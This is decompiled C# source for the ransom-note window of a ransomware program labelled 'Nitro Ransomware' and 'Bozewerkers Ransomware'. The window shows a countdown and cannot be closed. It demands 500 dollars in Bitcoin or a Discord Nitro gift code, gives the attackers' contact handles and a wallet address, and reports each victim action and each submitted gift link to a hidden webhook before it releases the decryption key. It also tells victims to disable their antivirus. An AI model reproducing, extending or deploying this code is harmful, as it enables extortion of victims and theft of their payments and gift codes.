using System;
using System.ComponentModel;
using System.Drawing;
using System.Timers;
using System.Windows.Forms;

namespace NitroRansomware;

public class Form1 : Form
{
	private Timer t;

	private int h = 3;

	private int m = 0;

	private int s = 0;

	private Webhook ww = new Webhook(Program.WEBHOOK);

	private IContainer components = null;

	private BackgroundWorker backgroundWorker1;

	private Label label2;

	private Label label4;

	private Button button1;

	private TextBox textBox3;

	private Label label6;

	private Button button2;

	private TextBox textBox4;

	private Label label10;

	private Panel panel1;

	private Label label1;

	private TextBox textBox1;

	private RichTextBox richTextBox1;

	private Label label3;

	private PictureBox pictureBox2;

	private PictureBox pictureBox1;

	private PictureBox pictureBox3;

	private Label label5;

	private PictureBox pictureBox4;

	private Label label7;

	private PictureBox pictureBox5;

	private Label label8;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		t = new Timer();
		t.Interval = 1000.0;
		t.Elapsed += OnTimeEvent;
		t.Start();
		foreach (string item in Crypto.encryptedFileLog)
		{
			_ = item;
		}
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Invalid comparison between Unknown and I4
		((CancelEventArgs)(object)e).Cancel = (int)e.get_CloseReason() == 3;
	}

	private void button1_Click(object sender, EventArgs e)
	{
		if (NitroValid())
		{
			((Control)textBox3).set_Text(Crypto.fPassword);
			((Control)label7).set_Text("Paste your key here.");
			((Control)label7).set_ForeColor(Color.LightGreen);
			((Control)textBox4).set_Text("");
			((Control)label1).set_Text("");
			((Control)textBox1).set_Text("How to Decrypt files:\r\n Enter decryption key and click on Decrypt button. \n Make sure Windows Defender and any other antivirus is off.\r\n Do not close the application while decrypting or else files may get corrupted.");
			t.Stop();
		}
	}

	private void button2_Click(object sender, EventArgs e)
	{
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_006c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		string text = ((Control)textBox4).get_Text();
		if (text == Crypto.fPassword)
		{
			ww.Send("```User has entered correct decryption key.. Decrypting files.```");
			MessageBox.Show("Key is correct. Decrypting files...", "Bozewerkers Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)64);
			Crypto.inPassword = Crypto.fPassword;
			Cursor.set_Current(Cursors.get_WaitCursor());
			Program.DecryptAll();
			Cursor.set_Current(Cursors.get_Default());
			MessageBox.Show("Task complete. If there are files that have not been decrypted, make sure you turn off all antivirus and Windows Defender, then try decrypting again. \r\nIf it doesn't work, delete all Desktop.ini.givemenitro files that you see and try again.", "Nitro Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)64);
		}
		else
		{
			MessageBox.Show("Invalid key", "Bozewerkers Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	private void textBox4_TextChanged(object sender, EventArgs e)
	{
	}

	private void label9_Click(object sender, EventArgs e)
	{
	}

	private void label2_Click(object sender, EventArgs e)
	{
	}

	private void label5_Click(object sender, EventArgs e)
	{
	}

	private void panel1_Paint(object sender, PaintEventArgs e)
	{
	}

	private void label10_Click(object sender, EventArgs e)
	{
	}

	private void label5_Click_1(object sender, EventArgs e)
	{
	}

	private void label7_Click(object sender, EventArgs e)
	{
	}

	private bool NitroValid()
	{
		//IL_0086: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f6: Unknown result type (might be due to invalid IL or missing references)
		Webhook webhook = new Webhook(Program.WEBHOOK);
		string text = ((Control)textBox1).get_Text();
		string empty = string.Empty;
		Console.WriteLine(text);
		if (text.Contains("discord.gift/"))
		{
			if (text.Contains("https://"))
			{
				int num = text.IndexOf("/");
				empty = text.Substring(num + 15);
				Console.WriteLine(empty);
			}
			else
			{
				int num2 = text.IndexOf("/");
				empty = text.Substring(num2 + 1);
				MessageBox.Show("Checking gift validity.. .", "Nitro Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)64);
			}
			if (Nitro.Check(empty))
			{
				webhook.Send("**Valid nitro code was received**");
				webhook.Send(text);
				MessageBox.Show("Success! Valid nitro code was sent. Your decryption key is now available. You may start decrypting your files now.", "Nitro Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)64);
				return true;
			}
			webhook.Send("```User sent invalid discord gift Link.```");
			MessageBox.Show("Invalid Nitro", "Nitro Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		else
		{
			webhook.Send("```User sent invalid discord gift Link.```");
			MessageBox.Show("Please enter a Discord nitro gift in this format discord.gift/code here", "Nitro Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		return false;
	}

	private void OnTimeEvent(object sender, ElapsedEventArgs e)
	{
		((Control)this).Invoke((Delegate)(Action)delegate
		{
			if (s < 1)
			{
				s = 59;
				if (m == 0)
				{
					m = 59;
					if (h != 0)
					{
						h--;
					}
				}
				else
				{
					m--;
				}
			}
			else
			{
				s--;
			}
			if (s != 0 || m != 0 || h != 0)
			{
			}
			((Control)label10).set_Text($"{h.ToString().PadLeft(2, '0')}:{m.ToString().PadLeft(2, '0')}:{s.ToString().PadLeft(2, '0')}");
		});
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		//IL_0169: Unknown result type (might be due to invalid IL or missing references)
		//IL_0173: Expected O, but got Unknown
		//IL_0226: Unknown result type (might be due to invalid IL or missing references)
		//IL_0230: Expected O, but got Unknown
		//IL_03d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_03db: Expected O, but got Unknown
		//IL_0484: Unknown result type (might be due to invalid IL or missing references)
		//IL_048e: Expected O, but got Unknown
		//IL_0542: Unknown result type (might be due to invalid IL or missing references)
		//IL_054c: Expected O, but got Unknown
		//IL_05f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0603: Expected O, but got Unknown
		//IL_06db: Unknown result type (might be due to invalid IL or missing references)
		//IL_06e5: Expected O, but got Unknown
		//IL_0738: Unknown result type (might be due to invalid IL or missing references)
		//IL_0742: Expected O, but got Unknown
		//IL_0761: Unknown result type (might be due to invalid IL or missing references)
		//IL_076b: Expected O, but got Unknown
		//IL_0808: Unknown result type (might be due to invalid IL or missing references)
		//IL_0812: Expected O, but got Unknown
		//IL_0898: Unknown result type (might be due to invalid IL or missing references)
		//IL_08a2: Expected O, but got Unknown
		//IL_0918: Unknown result type (might be due to invalid IL or missing references)
		//IL_0922: Expected O, but got Unknown
		//IL_099e: Unknown result type (might be due to invalid IL or missing references)
		//IL_09a8: Expected O, but got Unknown
		//IL_0a1c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a26: Expected O, but got Unknown
		//IL_0a9d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0aa7: Expected O, but got Unknown
		//IL_0b26: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b30: Expected O, but got Unknown
		//IL_0bc0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bca: Expected O, but got Unknown
		//IL_0c49: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c53: Expected O, but got Unknown
		//IL_0ce6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cf0: Expected O, but got Unknown
		//IL_0d72: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d7c: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		backgroundWorker1 = new BackgroundWorker();
		label2 = new Label();
		label4 = new Label();
		button1 = new Button();
		textBox3 = new TextBox();
		label6 = new Label();
		button2 = new Button();
		textBox4 = new TextBox();
		label10 = new Label();
		panel1 = new Panel();
		label1 = new Label();
		textBox1 = new TextBox();
		richTextBox1 = new RichTextBox();
		label3 = new Label();
		pictureBox2 = new PictureBox();
		pictureBox1 = new PictureBox();
		pictureBox3 = new PictureBox();
		label5 = new Label();
		pictureBox4 = new PictureBox();
		label7 = new Label();
		pictureBox5 = new PictureBox();
		label8 = new Label();
		((Control)panel1).SuspendLayout();
		((ISupportInitialize)pictureBox2).BeginInit();
		((ISupportInitialize)pictureBox1).BeginInit();
		((ISupportInitialize)pictureBox3).BeginInit();
		((ISupportInitialize)pictureBox4).BeginInit();
		((ISupportInitialize)pictureBox5).BeginInit();
		((Control)this).SuspendLayout();
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Segoe UI", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(Color.FromArgb(192, 0, 0));
		((Control)label2).set_Location(new Point(46, 282));
		((Control)label2).set_Name("label2");
		((Control)label2).set_RightToLeft((RightToLeft)0);
		((Control)label2).set_Size(new Size(437, 100));
		((Control)label2).set_TabIndex(5);
		((Control)label2).set_Text("Your pc has been encrypted by team Bozewerkers. \r\nPlease pay a amount of 500 dollars in BTC \r\nto get your files back and ur pc.\r\nYou can contact us on telegram @MeesterBandoo");
		((Control)label2).add_Click((EventHandler)label2_Click);
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Segoe UI", 8f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_ForeColor(SystemColors.Control);
		((Control)label4).set_Location(new Point(52, 463));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(0, 13));
		((Control)label4).set_TabIndex(9);
		((Control)button1).set_BackColor(SystemColors.Control);
		((ButtonBase)button1).set_FlatStyle((FlatStyle)0);
		((Control)button1).set_Location(new Point(284, 406));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(43, 10));
		((Control)button1).set_TabIndex(10);
		((Control)button1).set_Text("Bozewerkers");
		((ButtonBase)button1).set_UseVisualStyleBackColor(false);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)textBox3).set_BackColor(Color.FromArgb(35, 39, 42));
		((TextBoxBase)textBox3).set_BorderStyle((BorderStyle)1);
		((Control)textBox3).set_ForeColor(SystemColors.Window);
		((Control)textBox3).set_Location(new Point(0, -14));
		((Control)textBox3).set_Name("textBox3");
		((TextBoxBase)textBox3).set_ReadOnly(true);
		((Control)textBox3).set_Size(new Size(887, 20));
		((Control)textBox3).set_TabIndex(12);
		((Control)textBox3).set_TabStop(false);
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_Font(new Font("Segoe UI", 10f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label6).set_ForeColor(SystemColors.Control);
		((Control)label6).set_Location(new Point(51, 382));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(292, 38));
		((Control)label6).set_TabIndex(13);
		((Control)label6).set_Text("Fill in the code you bought \"dont try to guess \r\nbcs then ur pc is fucked in a instant");
		((Control)button2).set_BackColor(Color.FromArgb(255, 128, 128));
		((ButtonBase)button2).set_FlatStyle((FlatStyle)0);
		((Control)button2).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)button2).set_Location(new Point(121, 452));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(237, 28));
		((Control)button2).set_TabIndex(15);
		((Control)button2).set_Text("Decrypt files");
		((ButtonBase)button2).set_UseVisualStyleBackColor(false);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)textBox4).set_BackColor(Color.FromArgb(192, 0, 0));
		((TextBoxBase)textBox4).set_BorderStyle((BorderStyle)1);
		((Control)textBox4).set_Font(new Font("Verdana", 9.75f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)textBox4).set_ForeColor(SystemColors.Window);
		((Control)textBox4).set_Location(new Point(121, 423));
		((Control)textBox4).set_Name("textBox4");
		((Control)textBox4).set_Size(new Size(237, 23));
		((Control)textBox4).set_TabIndex(17);
		((Control)textBox4).set_TabStop(false);
		((Control)textBox4).set_Text("Fill in your key.");
		((Control)textBox4).add_TextChanged((EventHandler)textBox4_TextChanged);
		((Control)label10).set_AutoSize(true);
		((Control)label10).set_Font(new Font("Mongolian Baiti", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label10).set_ForeColor(SystemColors.ControlLightLight);
		((Control)label10).set_Location(new Point(227, 246));
		((Control)label10).set_Name("label10");
		((Control)label10).set_Size(new Size(57, 13));
		((Control)label10).set_TabIndex(22);
		((Control)label10).set_Text("00:00:00");
		((Control)label10).add_Click((EventHandler)label10_Click);
		((Control)panel1).set_BackColor(Color.FromArgb(192, 0, 0));
		((Control)panel1).get_Controls().Add((Control)(object)richTextBox1);
		((Control)panel1).get_Controls().Add((Control)(object)label1);
		((Control)panel1).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)panel1).set_Location(new Point(0, -1));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Size(new Size(526, 67));
		((Control)panel1).set_TabIndex(23);
		((Control)panel1).add_Paint(new PaintEventHandler(panel1_Paint));
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Mongolian Baiti", 50.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(SystemColors.ControlLightLight);
		((Control)label1).set_Location(new Point(39, 55));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(272, 71));
		((Control)label1).set_TabIndex(22);
		((Control)label1).set_Text("00:00:00");
		((Control)textBox1).set_BackColor(Color.FromArgb(35, 39, 42));
		((TextBoxBase)textBox1).set_BorderStyle((BorderStyle)1);
		((Control)textBox1).set_Font(new Font("Microsoft Sans Serif", 26.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox1).set_ForeColor(SystemColors.Window);
		((Control)textBox1).set_Location(new Point(-28, -14));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(610, 47));
		((Control)textBox1).set_TabIndex(8);
		((Control)textBox1).set_TabStop(false);
		((Control)richTextBox1).set_BackColor(Color.Red);
		((Control)richTextBox1).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)richTextBox1).set_Location(new Point(0, 18));
		((Control)richTextBox1).set_Name("richTextBox1");
		((Control)richTextBox1).set_Size(new Size(537, 34));
		((Control)richTextBox1).set_TabIndex(23);
		((Control)richTextBox1).set_Text("Oops your files are encrypted");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Segoe UI", 8f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(SystemColors.Control);
		((Control)label3).set_Location(new Point(212, 233));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(89, 13));
		((Control)label3).set_TabIndex(24);
		((Control)label3).set_Text("Remaining Time");
		pictureBox2.set_Image((Image)componentResourceManager.GetObject("pictureBox2.Image"));
		((Control)pictureBox2).set_Location(new Point(112, 84));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(137, 146));
		pictureBox2.set_SizeMode((PictureBoxSizeMode)4);
		pictureBox2.set_TabIndex(26);
		pictureBox2.set_TabStop(false);
		pictureBox1.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		((Control)pictureBox1).set_Location(new Point(255, 84));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(156, 146));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)4);
		pictureBox1.set_TabIndex(27);
		pictureBox1.set_TabStop(false);
		pictureBox3.set_Image((Image)componentResourceManager.GetObject("pictureBox3.Image"));
		((Control)pictureBox3).set_Location(new Point(12, 513));
		((Control)pictureBox3).set_Name("pictureBox3");
		((Control)pictureBox3).set_Size(new Size(26, 39));
		pictureBox3.set_SizeMode((PictureBoxSizeMode)4);
		pictureBox3.set_TabIndex(28);
		pictureBox3.set_TabStop(false);
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Font(new Font("Segoe UI", 10f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_ForeColor(SystemColors.Control);
		((Control)label5).set_Location(new Point(44, 522));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(119, 19));
		((Control)label5).set_TabIndex(29);
		((Control)label5).set_Text("@MeesterBandoo");
		((Control)label5).add_Click((EventHandler)label5_Click_1);
		pictureBox4.set_Image((Image)componentResourceManager.GetObject("pictureBox4.Image"));
		((Control)pictureBox4).set_Location(new Point(12, 558));
		((Control)pictureBox4).set_Name("pictureBox4");
		((Control)pictureBox4).set_Size(new Size(38, 30));
		pictureBox4.set_SizeMode((PictureBoxSizeMode)4);
		pictureBox4.set_TabIndex(30);
		pictureBox4.set_TabStop(false);
		((Control)label7).set_AutoSize(true);
		((Control)label7).set_Font(new Font("Segoe UI", 10f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label7).set_ForeColor(SystemColors.Control);
		((Control)label7).set_Location(new Point(55, 569));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(428, 19));
		((Control)label7).set_TabIndex(31);
		((Control)label7).set_Text("24#0810, opgeblazen#7517, SY#3520, Ex#8766 (Team Bozewerkers)");
		((Control)label7).add_Click((EventHandler)label7_Click);
		pictureBox5.set_Image((Image)componentResourceManager.GetObject("pictureBox5.Image"));
		((Control)pictureBox5).set_Location(new Point(169, 513));
		((Control)pictureBox5).set_Name("pictureBox5");
		((Control)pictureBox5).set_Size(new Size(32, 37));
		pictureBox5.set_SizeMode((PictureBoxSizeMode)4);
		pictureBox5.set_TabIndex(32);
		pictureBox5.set_TabStop(false);
		((Control)label8).set_AutoSize(true);
		((Control)label8).set_Font(new Font("Segoe UI", 10f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label8).set_ForeColor(SystemColors.Control);
		((Control)label8).set_Location(new Point(208, 522));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(295, 19));
		((Control)label8).set_TabIndex(33);
		((Control)label8).set_Text("bc1qkr6ju8slg38fudxtstpnlefgmgv5l0gk8lncxm");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Black);
		((Form)this).set_ClientSize(new Size(525, 600));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)label8);
		((Control)this).get_Controls().Add((Control)(object)pictureBox5);
		((Control)this).get_Controls().Add((Control)(object)label7);
		((Control)this).get_Controls().Add((Control)(object)pictureBox4);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)pictureBox3);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)pictureBox2);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label10);
		((Control)this).get_Controls().Add((Control)(object)panel1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)textBox4);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)label6);
		((Control)this).get_Controls().Add((Control)(object)textBox3);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).set_ForeColor(SystemColors.ControlText);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)panel1).ResumeLayout(false);
		((Control)panel1).PerformLayout();
		((ISupportInitialize)pictureBox2).EndInit();
		((ISupportInitialize)pictureBox1).EndInit();
		((ISupportInitialize)pictureBox3).EndInit();
		((ISupportInitialize)pictureBox4).EndInit();
		((ISupportInitialize)pictureBox5).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
